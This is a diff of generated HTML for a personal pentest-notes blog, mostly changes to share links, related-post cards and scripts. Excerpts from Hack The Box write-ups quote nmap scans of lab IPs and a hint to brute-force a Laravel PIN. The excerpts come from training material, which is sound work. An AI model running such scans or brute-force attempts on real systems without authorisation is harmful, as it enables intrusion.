-        <a href="https://twitter.com/intent/tweet?text=htb+secret+-+Yuchao+Toolbox&url=%2Fposts%2Fhtb-secret%2F" data-toggle="tooltip" data-placement="top"
+        <a href="https://twitter.com/intent/tweet?text=BurpSuite+Lab+-+Yuchao+Toolbox&url=%2Fposts%2FBurpSuite-Lab%2F" data-toggle="tooltip" data-placement="top"
           title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
           <i class="fa-fw fab fa-twitter"></i>
         </a>
     
       
-        <a href="https://www.facebook.com/sharer/sharer.php?title=htb+secret+-+Yuchao+Toolbox&u=%2Fposts%2Fhtb-secret%2F" data-toggle="tooltip" data-placement="top"
+        <a href="https://www.facebook.com/sharer/sharer.php?title=BurpSuite+Lab+-+Yuchao+Toolbox&u=%2Fposts%2FBurpSuite-Lab%2F" data-toggle="tooltip" data-placement="top"
           title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
           <i class="fa-fw fab fa-facebook-square"></i>
         </a>
     
       
-        <a href="https://t.me/share/url?url=%2Fposts%2Fhtb-secret%2F&text=htb+secret+-+Yuchao+Toolbox" data-toggle="tooltip" data-placement="top"
+        <a href="https://t.me/share/url?url=%2Fposts%2FBurpSuite-Lab%2F&text=BurpSuite+Lab+-+Yuchao+Toolbox" data-toggle="tooltip" data-placement="top"
           title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
           <i class="fa-fw fab fa-telegram"></i>
         </a>
@@ -1720,14 +1394,6 @@ attacker machine -&gt; <code class="language-plaintext highlighter-rouge">sudo t
 
 
 
-<!-- BS-toc.js will be loaded at medium priority -->
-<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>
-
-<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
-  <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
-  <nav id="toc" data-toggle="toc"></nav>
-</div>
-
 
     
   </div>
@@ -1764,111 +1430,111 @@ attacker machine -&gt; <code class="language-plaintext highlighter-rouge">sudo t
   
 
   
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
     
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
   
 
   
@@ -1942,7 +1608,7 @@ attacker machine -&gt; <code class="language-plaintext highlighter-rouge">sudo t
       
       
       <div class="card">
-        <a href="/posts/htb-stacked/">
+        <a href="/posts/Jr-Penetration-Tester/">
           <div class="card-body">
             <!--
   Date format snippet
@@ -1950,13 +1616,13 @@ attacker machine -&gt; <code class="language-plaintext highlighter-rouge">sudo t
 -->
 
 <em class="timeago small"
-    data-ts="1648524780"
+    data-ts="1643299200"
     
     >
-  2022-03-29
+  2022-01-28
 </em>
 
-            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>htb stacked</h3>
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Jr Penetrarion Test</h3>
             <div class="text-muted small">
               <p>
                 
@@ -1965,16 +1631,12 @@ attacker machine -&gt; <code class="language-plaintext highlighter-rouge">sudo t
 
 
 
-                recon
+                Content Discovery
 
-nmap
-1
-2
-nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.112
-nmap -p 22,80,2376 -sCV -oA scans/nmap-tcpscripts 10.10.11.112
-
-
-  22/tcp   open  ssh; 80/tcp   open  http; 2376/tcp ope...
+  Wappalyzer (https://www.wappalyzer.com/)
+  The Wayback Machine (https://archive.org/web/)
+  Automated Discovery https://github.com/danielmiessler/SecLists
+  ffuf,  “Fuzz Faster...
               </p>
             </div>
           </div>
@@ -1984,7 +1646,7 @@ nmap -p 22,80,2376 -sCV -oA scans/nmap-tcpscripts 10.10.11.112
       
       
       <div class="card">
-        <a href="/posts/htb-altered/">
+        <a href="/posts/pentestPlus/">
           <div class="card-body">
             <!--
   Date format snippet
@@ -1992,13 +1654,13 @@ nmap -p 22,80,2376 -sCV -oA scans/nmap-tcpscripts 10.10.11.112
 -->
 
 <em class="timeago small"
-    data-ts="1648870380"
+    data-ts="1621308780"
     
     >
-  2022-04-02
+  2021-05-18
 </em>
 
-            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>htb altered</h3>
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Pentest+ notes</h3>
             <div class="text-muted small">
               <p>
                 
@@ -2007,14 +1669,28 @@ nmap -p 22,80,2376 -sCV -oA scans/nmap-tcpscripts 10.10.11.112
 
 
 
-                Know it`s an php lavarel application behind nginx.
+                Tools:
 
-Brute force Laravel application pin
+cheetsheet
+https://highon.coffee/blog/penetration-testing-tools-cheat-sheet
 
-try type juggling
+Scanners
 
-  change content type to application/json
-  application/x-www-form-urlencoded, body is na...
+  Nikto
+  OpenVAS
+  sqlmap
+  Nessus
+  Nmap
+
+
+OSINT
+
+  WHOIS
+  Nslookup
+  FOCA
+  theHarvester
+  Shodan
+...
               </p>
             </div>
           </div>
@@ -2024,7 +1700,7 @@ try type juggling
       
       
       <div class="card">
-        <a href="/posts/htb-popcorn/">
+        <a href="/posts/htb-secret/">
           <div class="card-body">
             <!--
   Date format snippet
@@ -2032,13 +1708,13 @@ try type juggling
 -->
 
 <em class="timeago small"
-    data-ts="1615779180"
+    data-ts="1635552000"
     
     >
-  2021-03-15
+  2021-10-30
 </em>
 
-            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>htb popcorn</h3>
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>htb secret</h3>
             <div class="text-muted small">
               <p>
                 
@@ -2047,14 +1723,14 @@ try type juggling
 
 
 
-                Recon
-
-nmap
-nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.6
-nmap -p 22,80 -sC -sV -oA scans/tcpscripts 10.10.10.6
+                nmap
+nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.120
+nmap -p 22,80,3000 -sCV -oA scans/nmap-tcpscripts 10.10.11.120
 
 
-  OpenSSH 5.1p1, Apache httpd 2.2.12  —&amp;gt; older than Ubuntu Trusty 1...
+See 80, 3000 port run the same thing:
+
+  maybe 80 is a reverse pro...
               </p>
             </div>
           </div>
@@ -2073,17 +1749,17 @@ nmap -p 22,80 -sC -sV -oA scans/tcpscripts 10.10.10.6
 
 <div class="post-navigation d-flex justify-content-between">
   
-  <a href="/posts/pentestPlus/" class="btn btn-outline-primary"
+  <a href="/posts/self-reproducing-code/" class="btn btn-outline-primary"
     prompt="Older">
-    <p>Pentest+ notes</p>
+    <p>self reproducing code</p>
   </a>
   
 
   
-  <a href="/posts/Jr-Penetration-Tester/" class="btn btn-outline-primary"
+  <span class="btn btn-outline-primary disabled"
     prompt="Newer">
-    <p>Jr Penetrarion Test</p>
-  </a>
+    <p>-</p>
+  </span>
   
 
 </div>
@@ -2818,6 +2494,26 @@ SimpleJekyllSearch({
 
 <script defer src="/assets/js/dist/post.min.js"></script>
 
+
+  <!-- MathJax -->
+  <script>
+  /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */
+  MathJax = {
+    tex: {
+      inlineMath: [              /* start/end delimiter pairs for in-line math */
+        ['$','$'],
+        ['\\(','\\)']
+      ],
+      displayMath: [             /* start/end delimiter pairs for display math */
+        ['$$', '$$'],
+        ['\\[', '\\]']
+      ]
+    }
+  };
+  </script>
+  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+  </script>
 
 
 <!-- commons -->
